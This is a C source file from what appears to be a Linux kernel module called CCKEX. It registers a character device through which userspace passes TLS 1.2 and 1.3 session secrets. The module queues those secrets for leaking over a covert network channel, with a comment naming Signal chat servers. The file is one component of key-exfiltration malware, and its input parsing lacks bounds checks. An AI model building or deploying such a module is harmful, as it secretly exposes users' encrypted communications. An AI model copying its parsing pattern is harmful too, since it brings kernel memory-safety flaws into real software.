#include "chardev.h"

#include <linux/module.h>
#include <linux/kdev_t.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/string.h>
#include <asm/uaccess.h>
#include <linux/mutex.h>
#include <linux/err.h>

#include "common.h"
#include "net/filter.h"
#include "cc/cchandler.h"
#include "net/connection_list.h"
#include "crypto/hkdf/hkdf.h"

#include "net/tls_crypto.h"

static dev_t cckex_device_number;
static struct class *cckex_class;
static struct cdev cckex_chardev;

static int cckex_open(struct inode *inode, struct file *file) {
	return 0;
}

static int cckex_release(struct inode *inode, struct file *file) {
	return 0;
}

static struct perf_event* test_event = NULL;

static ssize_t cckex_read(struct file *file, char __user *user_buf, size_t count, loff_t *offset) {
//	cckex_test_tls_crypto();
//	cckex_init_output_encryption_key();
//	cckex_test_tls_crypto_384();
//	cckex_test_hkdf();

	return 0;
}

static ssize_t cckex_write(struct file *file, const char __user *user_buf, size_t count, loff_t *_offset) {

	uint8_t* buf = NULL;
	uint8_t* tmpbuf = NULL;
	size_t offset = 0;

	pr_info("CCKEX-LKM [%s] CHARDEV WRITE XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", __func__);
	pr_info("CCKEX-LKM [%s] count = %zu\n", __func__, count);

	//
	// TODO: just allocating this buffer and then letting it be in the kernel untracked while being used by diverse cckex
	//		 data structures is just beyond sketchy and screams for a memory leak to occur. FIX THAT!
	//		 => should be fixed

	// move data from userspace to kernelspace
	buf = kmalloc(count, GFP_KERNEL);
	if(!buf) {
		pr_warn("CCKEX-LKM [cckex_write]: unable to alloc %zu bytes for buf.", count);
		return 0;
	}

	if(copy_from_user(buf, user_buf, count)) {
		pr_warn("CCKEX-LKM [cckex_write]: unable to copy data from user.");
		kfree(buf);
		return 0;
	}
	
	cckex_print_mem(buf, count);

	// iterate over all 
	while(offset < count) {

		if (buf[offset] == 0xff && buf[offset + 1] == 0xf8) {
			//pr_info("CCKEX-LKM [%s] write TLS1.2 master_secret: ", __func__);
			//cckex_print_mem(buf + offset, 80);
			cckex_conn_set_tls12_master_secret(offset + buf + 2, 32, offset + buf + 2 + 32, 48);	
			offset += 82;
		} else if (buf[offset] == 0xff && buf[offset + 1] == 0xf7) {
			//pr_info("CCKEX-LKM [%s] write TLS1.3 client_traffic_secret: ", __func__);
			//cckex_print_mem(buf + offset, 80);
			cckex_conn_set_tls13_traffic_secret(offset + buf + 2, 32, offset + buf + 2 + 32, 48);
			offset += 82;
		} else if (buf[offset] == 0xff && buf[offset + 1] == 0xf6) {
			cckex_conn_set_tls13_handshake_secret(offset + buf + 2, 32, offset + buf + 2 + 32, 48);
			offset += 82;
		} else if (buf[offset] == 0xff && buf[offset + 1] == 0xf5) {
			cckex_conn_set_server_secret(offset + buf + 2, 32, offset + buf + 2 + 32, 48);
			offset += 82;
		} else if (buf[offset] == 0xff && buf[offset + 1] == 0xf4) {
			cckex_conn_set_server_handshake_secret(offset + buf + 2, 32, offset + buf + 2 + 32, 48);
			offset += 82;
		} else {

			// TODO: this currently cannot handle concated keylist entries

			// prepare list entry
			struct cckex_key_list_entry* entry = kmalloc(sizeof(struct cckex_key_list_entry), GFP_KERNEL);
			if(!entry) {
				pr_warn("CCKEX-LKM [cckex_write]: unable to alloc mem for cckex_key_list_entry.");
				kfree(buf);
				return 0;
			}

			tmpbuf = kmalloc(count, GFP_KERNEL);
			if(!tmpbuf) {
				pr_warn("CCKEX_LKM [%s] failed to allocate tmpbuf.", __func__);
				kfree(buf);
				kfree(entry);
				return 0;
			}

			memcpy(tmpbuf, buf, count);

			entry->buf = tmpbuf;
			entry->size = count;
			entry->bit_offset = 0;
			entry->byte_offset = 0;
			entry->id = entry->buf + 3;
			entry->id_size = CCKEX_ID_SIZE;
			entry->key = entry->buf + CCKEX_ID_SIZE + 3;
			entry->key_size = CCKEX_KEY_SIZE;
			entry->iv = entry->buf + CCKEX_ID_SIZE + CCKEX_KEY_SIZE + 3;
			entry->iv_size = CCKEX_IV_SIZE;
			entry->mac_key = entry->buf + CCKEX_ID_SIZE + CCKEX_KEY_SIZE + CCKEX_IV_SIZE + 3;
			entry->mac_key_size = CCKEX_MAC_KEY_SIZE;
			entry->used_to_inject_data = 0;
			entry->msg_already_sent = 0;
			// Use CCKex Header payload size, because the exfil size may be smaller than the buffer size 
			entry->size_to_exfiltrate = tmpbuf[2] + 3;

			// enqueue data in cckex input list

			cckex_keylist_add_entry(entry);

			//pr_info("CCKEX-LKM [cckex_write]: add new entry to cckex_key_list for id: ");
			//cckex_print_mem(entry->id, entry->id_size);

			offset += count;
		}
	}

	// free user buffer again
	kfree(buf);

	cckex_try_stage_secrets();

	return count;
}

static long cckex_ioctl(struct file *file, unsigned int cmd, unsigned long args) {

	long ret = 0;

	switch (cmd) {
		case IOCTL_CMD_RESET:
			pr_info("CCKEX_LKM [%s] RESET LISTS", __func__);
			cckex_keylist_reset();
			cckex_conn_list_reset();
			// TODO: maybe also reset ip list here. However, it could occur that the signal chat server ips are 
			//		 already cached and no new requests are sent. Thus a reset of the ip list could cause the LKM
			//		 to miss requests to the server
			break;

		case IOCTL_CMD_CHNG_CC_MODE: {
			struct cckex_ioctl_cc_mode cc_mode;

			if(copy_from_user(&cc_mode, (cckex_ioctl_cc_mode_t*)args, sizeof(cckex_ioctl_cc_mode_t))) return -EFAULT;

			ret = cckex_change_cc(&cc_mode); 

			break;
		}

		case IOCTL_CMD_CHNG_CIPHER: {
			cckex_ioctl_cipher_mode_t cipher_mode;

			if(copy_from_user(&cipher_mode, (cckex_ioctl_cipher_mode_t*)args, sizeof(cckex_ioctl_cipher_mode_t))) return -EFAULT;	

			if(cipher_mode.action == CCKEX_CIPHER_OUT_ENCRYPTION_ENABLE) {
				cckex_set_output_encryption(1);
			} else if(cipher_mode.action == CCKEX_CIPHER_OUT_ENCRYPTION_DISABLE) {
				cckex_set_output_encryption(0);
			}

			break;
		}

		case IOCTL_CMD_CHNG_FILTER:
			break;

		default:
			pr_warn("CCKEX-LKM [%s]: invalid cmd=%i", __func__, cmd);
			ret = -1;
			break;
	}

	return ret;
}

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.open = cckex_open,
	.release = cckex_release,
	.read = cckex_read,
	.write = cckex_write,
	.unlocked_ioctl = cckex_ioctl
};

int cckex_register_chardev(void) {

	struct device *dev = NULL;
	int ret = alloc_chrdev_region(&cckex_device_number, 0, 1, CCKEX_MODULE_NAME);

	if(ret) return ret;

	// TODO: replace this if macro block by a if kernel version block
	cckex_class = class_create(THIS_MODULE, CCKEX_DRIVER_CLASS_NAME);

	if(IS_ERR_VALUE(cckex_class)) return PTR_ERR(cckex_class);

	cdev_init(&cckex_chardev, &fops);

	ret = cdev_add(&cckex_chardev, cckex_device_number, 1);
	if(ret) return ret;

	dev = device_create(cckex_class, NULL, cckex_device_number, NULL, CCKEX_MODULE_NAME);
	if(IS_ERR_VALUE(dev)) return PTR_ERR(dev);

	return ret;
}

void cckex_unregister_chardev(void) {
	cdev_del(&cckex_chardev);
	device_destroy(cckex_class, cckex_device_number);
	class_destroy(cckex_class);
	unregister_chrdev_region(cckex_device_number, 5);
}
